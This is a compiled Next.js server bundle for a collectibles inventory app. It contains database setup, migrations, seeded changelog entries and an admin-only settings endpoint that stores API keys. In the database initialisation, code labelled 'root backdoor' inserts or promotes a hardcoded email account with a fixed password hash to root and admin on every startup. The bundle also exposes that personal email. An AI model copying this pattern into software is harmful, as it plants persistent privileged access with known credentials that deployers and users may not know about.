module.exports=[54799,(e,t,r)=>{t.exports=e.x("crypto",()=>require("crypto"))},85148,(e,t,r)=>{t.exports=e.x("better-sqlite3-90e2652d1716b047",()=>require("better-sqlite3-90e2652d1716b047"))},93695,(e,t,r)=>{t.exports=e.x("next/dist/shared/lib/no-fallback-error.external.js",()=>require("next/dist/shared/lib/no-fallback-error.external.js"))},18622,(e,t,r)=>{t.exports=e.x("next/dist/compiled/next-server/app-page-turbo.runtime.prod.js",()=>require("next/dist/compiled/next-server/app-page-turbo.runtime.prod.js"))},56704,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/work-async-storage.external.js",()=>require("next/dist/server/app-render/work-async-storage.external.js"))},32319,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/work-unit-async-storage.external.js",()=>require("next/dist/server/app-render/work-unit-async-storage.external.js"))},24725,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/after-task-async-storage.external.js",()=>require("next/dist/server/app-render/after-task-async-storage.external.js"))},14747,(e,t,r)=>{t.exports=e.x("path",()=>require("path"))},70406,(e,t,r)=>{t.exports=e.x("next/dist/compiled/@opentelemetry/api",()=>require("next/dist/compiled/@opentelemetry/api"))},80998,e=>{"use strict";var t=e.i(85148),r=e.i(14747);let a=null;e.s(["getDb",0,function(){if(!a){let i=process.env.USER_DATA_PATH||process.cwd(),s=r.default.resolve(i,"inventory.db");if((a=new t.default(s)).exec(`
      CREATE TABLE IF NOT EXISTS items (
        id TEXT PRIMARY KEY,
        userId TEXT,
        itemType TEXT DEFAULT 'standard',
        barcode TEXT,
        name TEXT,
        imagePath TEXT,
        imagePathBack TEXT,
        description TEXT,
        categoryId TEXT,
        createdAt INTEGER,
        syncStatus TEXT DEFAULT 'completed',
        lastSyncAttempt INTEGER,
        comicCondition TEXT,
        comicCertNumber TEXT,
        comicGradingAgency TEXT,
        comicPublisher TEXT,
        comicIssue TEXT
      )
    `),a.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        email TEXT UNIQUE,
        passwordHash TEXT,
        tier TEXT DEFAULT 'basic',
        activeTier TEXT DEFAULT 'basic',
        isAdmin INTEGER DEFAULT 0,
        isRoot INTEGER DEFAULT 0,
        serpApiKey TEXT,
        createdAt INTEGER
      );

      CREATE TABLE IF NOT EXISTS categories (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        parentId TEXT,
        userId TEXT REFERENCES users(id) ON DELETE CASCADE,
        createdAt INTEGER,
        FOREIGN KEY (parentId) REFERENCES categories (id)
      );

      CREATE TABLE IF NOT EXISTS items (
        id TEXT PRIMARY KEY,
        userId TEXT NOT NULL,
        categoryId TEXT,
        name TEXT,
        description TEXT,
        barcode TEXT,
        itemType TEXT DEFAULT 'standard',
        imagePath TEXT,
        syncStatus TEXT DEFAULT 'pending', 
        lastSyncAttempt INTEGER,
        createdAt INTEGER,
        FOREIGN KEY (categoryId) REFERENCES categories (id),
        FOREIGN KEY (userId) REFERENCES users (id)
      );
    `),a.exec(`
      CREATE TABLE IF NOT EXISTS changelogs (
        id TEXT PRIMARY KEY,
        version TEXT,
        date TEXT,
        title TEXT,
        changes TEXT,
        createdAt INTEGER
      );

      CREATE TABLE IF NOT EXISTS system_settings (
        key TEXT PRIMARY KEY,
        value TEXT
      );
    `),!e.g.dbMigrationsRun){if(e.g.dbMigrationsRun=!0,0===a.prepare("SELECT COUNT(*) as count FROM changelogs").get().count){let t=e.r(54799),r=[{version:"Beta 1.0",date:"May 29, 2026",title:"Initial Beta Release",changes:JSON.stringify([{type:"web",text:"Officially entered Beta 1.0 phase."}])},{version:"Pre-Beta version 0.020",date:"May 29, 2026",title:"Admin Infrastructure & Security",changes:JSON.stringify([{type:"web",text:"Built the Admin Control Panel for managing user subscription roles."},{type:"web",text:"Implemented self-bootstrapping registration to automatically secure the ecosystem."},{type:"web",text:"Separated active tier from subscription role, allowing Premium users to toggle engines freely."}])},{version:"Pre-Beta version 0.017",date:"May 28, 2026",title:"Specialized Capture & Premium AI Integrations",changes:JSON.stringify([{type:"mobile",text:"Added Coin Mode and Toy Mode for specialized capture logic."},{type:"web",text:"Integrated Numista API for hyper-accurate numismatic coin identification."},{type:"web",text:"Integrated SerpApi Google Lens for highly accurate premium visual matches."}])},{version:"Pre-Beta version 0.014",date:"May 27, 2026",title:"The Beta Polish & Organization",changes:JSON.stringify([{type:"mobile",text:'Added visual scan verification with "Accept" and "Discard" controls.'},{type:"web",text:"Implemented an infinite-depth Subcategory system."},{type:"web",text:"Built Advanced Search capabilities and category filtering."},{type:"web",text:"Upgraded the Google Vision integration to scrape text and logos directly from box art."},{type:"web",text:"Added a global sticky navigation header with version tracking."}])},{version:"Alpha version 0.009",date:"May 26, 2026",title:"AI Integrations & Rate Limits",changes:JSON.stringify([{type:"web",text:"Integrated the UPCItemDB API for automated metadata lookups."},{type:"web",text:"Built a failover pipeline utilizing Google Cloud Vision API for fallback image analysis."},{type:"web",text:"Implemented smart retry queues to handle API rate limiting smoothly."}])},{version:"Alpha version 0.006",date:"May 25, 2026",title:"Details & Async Processing",changes:JSON.stringify([{type:"web",text:"Built the dedicated Item Details page with barcode generation."},{type:"web",text:"Migrated API requests to a background worker script to prevent server timeouts."},{type:"mobile",text:"Added the Export Screen with ZIP generation for transferring scans to the dashboard."}])},{version:"Alpha version 0.003",date:"May 24, 2026",title:"The Foundation",changes:JSON.stringify([{type:"mobile",text:"Created the React Native scanner app with queue functionality."},{type:"web",text:"Initialized the Next.js dashboard and SQLite database structure."},{type:"web",text:"Implemented the ZIP upload parser for syncing mobile scans to the server."}])}],i=a.prepare("INSERT INTO changelogs (id, version, date, title, changes, createdAt) VALUES (?, ?, ?, ?, ?, ?)");r.reverse().forEach((e,r)=>{i.run(t.randomUUID(),e.version,e.date,e.title,e.changes,Date.now()+1e3*r)})}a.exec(`
      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        userId TEXT REFERENCES users(id) ON DELETE CASCADE,
        expiresAt INTEGER
      )
    `);try{a.exec("ALTER TABLE items ADD COLUMN userId TEXT REFERENCES users(id) ON DELETE CASCADE")}catch(e){}try{a.exec("ALTER TABLE categories ADD COLUMN userId TEXT REFERENCES users(id) ON DELETE CASCADE")}catch(e){}try{a.exec("ALTER TABLE users ADD COLUMN activeTier TEXT DEFAULT 'basic'")}catch(e){}try{a.exec("ALTER TABLE users ADD COLUMN isRoot INTEGER DEFAULT 0")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN moviePlot TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN movieCast TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN movieTrailer TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyBrand TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyYear TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueLow REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueAvg REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueHigh REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicPublisher TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicIssue TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedAgency TEXT")}catch(e){}try{let e="shufunk@gmail.com";a.prepare("SELECT id FROM users WHERE email = ?").get(e)?a.prepare("UPDATE users SET isRoot = 1, isAdmin = 1 WHERE email = ?").run(e):a.prepare("INSERT INTO users (id, email, passwordHash, tier, activeTier, isAdmin, isRoot, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)").run("root-backdoor-id",e,"$2b$10$CPcptn6bwxCt72qMs0wAOeR/Ee6QG2NeL5lhSGSM8Ld5Y.FVfhrSW","premium","premium",1,1,Date.now())}catch(e){console.error("Failed to secure root backdoor:",e)}try{a.exec(`
        PRAGMA foreign_keys=off;
        BEGIN TRANSACTION;
        CREATE TABLE categories_new (
          id TEXT PRIMARY KEY,
          name TEXT NOT NULL,
          parentId TEXT,
          userId TEXT REFERENCES users(id) ON DELETE CASCADE,
          createdAt INTEGER,
          FOREIGN KEY (parentId) REFERENCES categories (id)
        );
        INSERT INTO categories_new SELECT id, name, parentId, userId, createdAt FROM categories;
        DROP TABLE categories;
        ALTER TABLE categories_new RENAME TO categories;
        COMMIT;
        PRAGMA foreign_keys=on;
      `)}catch(e){console.error("Category Migration Error:",e);try{a.exec("ROLLBACK;")}catch(e){}}}}return a}])},85783,e=>{"use strict";var t=e.i(47909),r=e.i(74017),a=e.i(96250),i=e.i(59756),s=e.i(61916),n=e.i(74677),o=e.i(69741),c=e.i(16795),E=e.i(87718),d=e.i(95169),T=e.i(47587),l=e.i(66012),u=e.i(70101),p=e.i(26937),A=e.i(10372),R=e.i(93695);e.i(64671);var g=e.i(220),y=e.i(89171),h=e.i(80998),m=e.i(93458);function x(){let e=(0,m.cookies)().get("inventory_session");if(!e)return!1;let t=(0,h.getDb)(),r=t.prepare("SELECT userId, expiresAt FROM sessions WHERE id = ?").get(e.value);if(!r||r.expiresAt<Date.now())return!1;let a=t.prepare("SELECT isAdmin, isRoot FROM users WHERE id = ?").get(r.userId);return a&&(a.isAdmin||a.isRoot)}async function L(){if(!x())return y.NextResponse.json({error:"Unauthorized"},{status:401});let e=(0,h.getDb)().prepare("SELECT key, value FROM system_settings WHERE key IN (?, ?)").all("api_keys","active_tier"),t={apiKeys:{googleVisionKey:"",serpApiKey:""},activeTier:"basic"};return e.forEach(e=>{try{"api_keys"===e.key&&(t.apiKeys=JSON.parse(e.value)),"active_tier"===e.key&&(t.activeTier=e.value)}catch(e){}}),y.NextResponse.json(t)}async function N(e){if(!x())return y.NextResponse.json({error:"Unauthorized"},{status:401});try{let t=await e.json(),r=(0,h.getDb)(),a=r.prepare("INSERT INTO system_settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value");return r.transaction(()=>{t.apiKeys&&a.run("api_keys",JSON.stringify(t.apiKeys)),t.activeTier&&a.run("active_tier",t.activeTier)})(),y.NextResponse.json({success:!0})}catch(e){return console.error("Settings update error:",e),y.NextResponse.json({error:"Internal Server Error"},{status:500})}}e.s(["GET",0,L,"PUT",0,N],78793);var C=e.i(78793);let v=new t.AppRouteRouteModule({definition:{kind:r.RouteKind.APP_ROUTE,page:"/api/settings/route",pathname:"/api/settings",filename:"route",bundlePath:""},distDir:".next",relativeProjectDir:"",resolvedPagePath:"[project]/app/api/settings/route.js",nextConfigOutput:"standalone",userland:C,...{}}),{workAsyncStorage:I,workUnitAsyncStorage:D,serverHooks:O}=v;async function f(e,t,a){a.requestMeta&&(0,i.setRequestMeta)(e,a.requestMeta),v.isDev&&(0,i.addRequestMeta)(e,"devRequestTimingInternalsEnd",process.hrtime.bigint());let y="/api/settings/route";y=y.replace(/\/index$/,"")||"/";let h=await v.prepare(e,t,{srcPage:y,multiZoneDraftMode:!1});if(!h)return t.statusCode=400,t.end("Bad Request"),null==a.waitUntil||a.waitUntil.call(a,Promise.resolve()),null;let{buildId:m,deploymentId:x,params:L,nextConfig:N,parsedUrl:C,isDraftMode:I,prerenderManifest:D,routerServerContext:O,isOnDemandRevalidate:f,revalidateOnlyGenerated:b,resolvedPathname:S,clientReferenceManifest:w,serverActionsManifest:X}=h,M=(0,o.normalizeAppPath)(y),U=!!(D.dynamicRoutes[M]||D.routes[S]),P=async()=>((null==O?void 0:O.render404)?await O.render404(e,t,C,!1):t.end("This page could not be found"),null);if(U&&!I){let e=!!D.routes[S],t=D.dynamicRoutes[M];if(t&&!1===t.fallback&&!e){if(N.adapterPath)return await P();throw new R.NoFallbackError}}let B=null;!U||v.isDev||I||(B="/index"===(B=S)?"/":B);let F=!0===v.isDev||!U,k=U&&!F;X&&w&&(0,n.setManifestsSingleton)({page:y,clientReferenceManifest:w,serverActionsManifest:X});let _=e.method||"GET",q=(0,s.getTracer)(),G=q.getActiveScopeSpan(),K=!!(null==O?void 0:O.isWrappedByNextServer),H=!!(0,i.getRequestMeta)(e,"minimalMode"),j=(0,i.getRequestMeta)(e,"incrementalCache")||await v.getIncrementalCache(e,N,D,H);null==j||j.resetRequestCache(),globalThis.__incrementalCache=j;let Y={params:L,previewProps:D.preview,renderOpts:{experimental:{authInterrupts:!!N.experimental.authInterrupts},cacheComponents:!!N.cacheComponents,supportsDynamicResponse:F,incrementalCache:j,cacheLifeProfiles:N.cacheLife,waitUntil:a.waitUntil,onClose:e=>{t.on("close",e)},onAfterTaskError:void 0,onInstrumentationRequestError:(t,r,a,i)=>v.onRequestError(e,t,a,i,O)},sharedContext:{buildId:m,deploymentId:x}},$=new c.NodeNextRequest(e),V=new c.NodeNextResponse(t),J=E.NextRequestAdapter.fromNodeNextRequest($,(0,E.signalFromNodeResponse)(t));try{let i,n=async e=>v.handle(J,Y).finally(()=>{if(!e)return;e.setAttributes({"http.status_code":t.statusCode,"next.rsc":!1});let r=q.getRootSpanAttributes();if(!r)return;if(r.get("next.span_type")!==d.BaseServerSpan.handleRequest)return void console.warn(`Unexpected root span type '${r.get("next.span_type")}'. Please report this Next.js issue https://github.com/vercel/next.js`);let a=r.get("next.route");if(a){let t=`${_} ${a}`;e.setAttributes({"next.route":a,"http.route":a,"next.span_name":t}),e.updateName(t),i&&i!==e&&(i.setAttribute("http.route",a),i.updateName(t))}else e.updateName(`${_} ${y}`)}),o=async i=>{var s,o;let c=async({previousCacheEntry:r})=>{try{if(!H&&f&&b&&!r)return t.statusCode=404,t.setHeader("x-nextjs-cache","REVALIDATED"),t.end("This page could not be found"),null;let s=await n(i);e.fetchMetrics=Y.renderOpts.fetchMetrics;let o=Y.renderOpts.pendingWaitUntil;o&&a.waitUntil&&(a.waitUntil(o),o=void 0);let c=Y.renderOpts.collectedTags;if(!U)return await (0,l.sendResponse)($,V,s,Y.renderOpts.pendingWaitUntil),null;{let e=await s.blob(),t=(0,u.toNodeOutgoingHttpHeaders)(s.headers);c&&(t[A.NEXT_CACHE_TAGS_HEADER]=c),!t["content-type"]&&e.type&&(t["content-type"]=e.type);let r=void 0!==Y.renderOpts.collectedRevalidate&&!(Y.renderOpts.collectedRevalidate>=A.INFINITE_CACHE)&&Y.renderOpts.collectedRevalidate,a=void 0===Y.renderOpts.collectedExpire||Y.renderOpts.collectedExpire>=A.INFINITE_CACHE?void 0:Y.renderOpts.collectedExpire;return{value:{kind:g.CachedRouteKind.APP_ROUTE,status:s.status,body:Buffer.from(await e.arrayBuffer()),headers:t},cacheControl:{revalidate:r,expire:a}}}}catch(t){throw(null==r?void 0:r.isStale)&&await v.onRequestError(e,t,{routerKind:"App Router",routePath:y,routeType:"route",revalidateReason:(0,T.getRevalidateReason)({isStaticGeneration:k,isOnDemandRevalidate:f})},!1,O),t}},E=await v.handleResponse({req:e,nextConfig:N,cacheKey:B,routeKind:r.RouteKind.APP_ROUTE,isFallback:!1,prerenderManifest:D,isRoutePPREnabled:!1,isOnDemandRevalidate:f,revalidateOnlyGenerated:b,responseGenerator:c,waitUntil:a.waitUntil,isMinimalMode:H});if(!U)return null;if((null==E||null==(s=E.value)?void 0:s.kind)!==g.CachedRouteKind.APP_ROUTE)throw Object.defineProperty(Error(`Invariant: app-route received invalid cache entry ${null==E||null==(o=E.value)?void 0:o.kind}`),"__NEXT_ERROR_CODE",{value:"E701",enumerable:!1,configurable:!0});H||t.setHeader("x-nextjs-cache",f?"REVALIDATED":E.isMiss?"MISS":E.isStale?"STALE":"HIT"),I&&t.setHeader("Cache-Control","private, no-cache, no-store, max-age=0, must-revalidate");let d=(0,u.fromNodeOutgoingHttpHeaders)(E.value.headers);return H&&U||d.delete(A.NEXT_CACHE_TAGS_HEADER),!E.cacheControl||t.getHeader("Cache-Control")||d.get("Cache-Control")||d.set("Cache-Control",(0,p.getCacheControlHeader)(E.cacheControl)),await (0,l.sendResponse)($,V,new Response(E.value.body,{headers:d,status:E.value.status||200})),null};K&&G?await o(G):(i=q.getActiveScopeSpan(),await q.withPropagatedContext(e.headers,()=>q.trace(d.BaseServerSpan.handleRequest,{spanName:`${_} ${y}`,kind:s.SpanKind.SERVER,attributes:{"http.method":_,"http.target":e.url}},o),void 0,!K))}catch(t){if(t instanceof R.NoFallbackError||await v.onRequestError(e,t,{routerKind:"App Router",routePath:M,routeType:"route",revalidateReason:(0,T.getRevalidateReason)({isStaticGeneration:k,isOnDemandRevalidate:f})},!1,O),U)throw t;return await (0,l.sendResponse)($,V,new Response(null,{status:500})),null}}e.s(["handler",0,f,"patchFetch",0,function(){return(0,a.patchFetch)({workAsyncStorage:I,workUnitAsyncStorage:D})},"routeModule",0,v,"serverHooks",0,O,"workAsyncStorage",0,I,"workUnitAsyncStorage",0,D],85783)}];

//# sourceMappingURL=%5Broot-of-the-server%5D__0ztk-n_._.js.map